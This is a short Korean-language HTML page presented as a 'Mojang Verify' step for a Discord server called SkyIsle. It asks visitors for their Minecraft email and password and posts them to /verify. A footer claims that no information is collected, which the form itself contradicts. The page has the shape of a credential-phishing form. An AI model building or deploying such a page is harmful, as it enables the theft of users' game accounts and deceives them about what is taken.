<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mojang Verify for SkyIsle Discord</title>
</head>
<body>
    <h1>SkyIsle Discord 인증</h1>
    <form method="POST" action="/verify" enctype="application/x-www-form-urlencoded">
        <input type="email" placeholder="마인크래프트 이메일" name="email">
        <input type="password" placeholder="마인크래프트 비밀번호" name="password">
        <button type="submit">인증</button>
    </form>
    <hr color="black">
    <p>수집하는 정보: 없음, 닉네임과 비밀번호와 디스코드 아이디는 인증을 위해서만 사용</p>
</body>
</html>
